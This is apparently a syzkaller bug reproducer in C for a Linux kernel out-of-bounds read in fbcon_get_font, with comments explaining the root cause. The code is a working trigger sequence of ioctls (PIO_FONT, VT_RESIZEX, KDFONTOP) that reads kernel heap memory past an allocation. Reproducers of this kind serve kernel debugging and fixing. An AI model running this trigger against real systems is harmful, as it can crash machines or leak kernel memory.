// Reproducer for: KASAN: slab-out-of-bounds in fbcon_get_font
// https://syzkaller.appspot.com/bug?id=a11372b6c9b5fd4abe1c266903bcb27e80e8f2bc
//
// Root cause: vt_resizex() directly sets vc_font.height for all VTs WITHOUT
// reallocating the font buffer. If the new height * charcount exceeds the
// allocated buffer size, fbcon_get_font() reads out-of-bounds.
//
// Trigger sequence:
//   1. PIO_FONT: set font with height=1 (auto-detected), allocates 256*1=256 bytes
//   2. VT_RESIZEX with v_clin=5: sets vc_font.height=5 for all VTs (no realloc).
//      fbcon_resize() detects size overflow and returns -EINVAL, but the height
//      assignment in vt_resizex already happened and is not rolled back.
//   3. KDFONTOP GET: j=vc_font.height=5, charcount=256, reads 5*256=1280 bytes
//      from the 256-byte allocation => KASAN: slab-out-of-bounds

#define _GNU_SOURCE

#include <fcntl.h>
#include <linux/kd.h>
#include <linux/vt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#ifndef VT_RESIZEX
#define VT_RESIZEX 0x560A
#endif

#ifndef PIO_FONT
/* In this kernel, PIO_FONT = 0x4B61 (expanded form, old-style font set) */
#define PIO_FONT 0x4B61
#endif

int main(void)
{
  /* Map memory region for font data and ioctl buffers */
  void *mem = mmap((void *)0x20000000ul, 0x1000000ul, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
  if (mem == MAP_FAILED) {
    perror("mmap");
    return 1;
  }

  /* Step 1: Open /dev/tty10 */
  int fd = open("/dev/tty10", O_RDWR);
  if (fd < 0) {
    perror("open /dev/tty10");
    return 1;
  }

  /*
   * Step 2: PIO_FONT (0x4B61) - set font with auto-detected height=1
   *
   * con_font_set() reads 256*32 = 8192 bytes from userspace, then scans
   * from row 32 downward to find the last non-zero row. With only
   * fontdata[0]=1 set (char 0, row 0), the detected height is 1.
   *
   * fbcon_set_font() allocates FONT_EXTRA_WORDS*4 + height*1*256
   *   = 16 + 1*256 = 272 bytes total (272 rounded up in kmalloc).
   * vc_font.data points into the allocation, FNTSIZE = 256 bytes.
   */
  char *fontdata = (char *)0x20000000ul;
  memset(fontdata, 0, 256 * 32);
  fontdata[0] = 1; /* char 0, row 0 non-zero => height auto-detected = 1 */
  if (ioctl(fd, PIO_FONT, fontdata) < 0) {
    perror("PIO_FONT");
    /* non-fatal: try to continue */
  }

  /*
   * Step 3: VT_RESIZEX (0x560A) with v_clin=5
   *
   * vt_resizex() iterates all VTs and, for each:
   *   vc->vc_font.height = v_clin;   // <- set HEIGHT without realloc!
   *   vc_resize(vc, v_cols, v_rows);
   *
   * With v_cols=0 and v_rows=0:
   *   - v_vlin is filled from vc_scan_lines (nonzero on real hardware)
   *   - v_rows = v_vlin / v_clin (computed inside vt_resizex)
   *   - vc_do_resize() calls fbcon_resize(), which detects that
   *     new_size = height * pitch * charcount = 5*1*256 = 1280 > FNTSIZE=256
   *     and returns -EINVAL -- but vc_font.height=5 was already set and
   *     is NOT rolled back.
   *
   * Result for VT 10: vc_font.height=5, vc_font.data=256-byte buffer.
   */
  struct vt_consize vcs;
  memset(&vcs, 0, sizeof(vcs));
  vcs.v_clin = 5; /* set character height to 5 for all VTs */
  ioctl(fd, VT_RESIZEX, &vcs);

  /*
   * Step 4: KDFONTOP GET (0x4B72)
   *
   * con_font_get() -> fbcon_get_font():
   *   j = vc_font.height = 5
   *   font->charcount = vc_hi_font_mask ? 512 : 256  => 256
   *   for (i = 0; i < 256; i++) memcpy(data, fontdata, j);  fontdata += j;
   *
   * Total bytes read from vc_font.data: 5 * 256 = 1280 bytes
   * Allocated size: 256 bytes
   *
   * => KASAN: slab-out-of-bounds (reads 1024 bytes past end of allocation)
   */
  char *getbuf = (char *)0x20001000ul;
  struct console_font_op op;
  memset(&op, 0, sizeof(op));
  op.op    = KD_FONT_OP_GET;
  op.flags = 0;
  op.width = 32;
  op.height = 32;
  op.charcount = 512;
  op.data  = (unsigned char *)getbuf;
  ioctl(fd, KDFONTOP, &op);

  close(fd);
  return 0;
}
